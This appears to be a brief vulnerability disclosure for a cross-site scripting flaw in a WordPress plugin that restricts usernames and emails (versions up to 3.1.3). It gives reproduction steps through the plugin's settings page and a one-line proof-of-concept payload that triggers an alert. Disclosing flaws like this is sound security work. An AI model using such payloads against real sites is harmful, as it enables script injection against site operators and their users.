Cross-Site Scripting (XSS) vulnerability in WP Restrict Usernames Emails Characters Plugin <= 3.1.3 at WordPress.

[![piuSqRs.png](https://z1.ax1x.com/2023/11/01/piuSqRs.png)](https://imgse.com/i/piuSqRs)

- [ ] STEPS:
  
  ```
  1.After installing the plugin, click Settings. Then click Restrict Usernames Emails Characters.
  
   Put poc in The name of the user_login field in registration form , then click Save  Changes.
  ```

[![piupPJJ.png](https://z1.ax1x.com/2023/11/01/piupPJJ.png)](https://imgse.com/i/piupPJJ)

POC：

```
"><img src=1 onerror=alert(/xss/)>
```


```
2.Then XSS vulnerability triggered
```

[![piupmdO.png](https://z1.ax1x.com/2023/11/01/piupmdO.png)](https://imgse.com/i/piupmdO)

[![piup8yt.png](https://z1.ax1x.com/2023/11/01/piup8yt.png)](https://imgse.com/i/piup8yt)
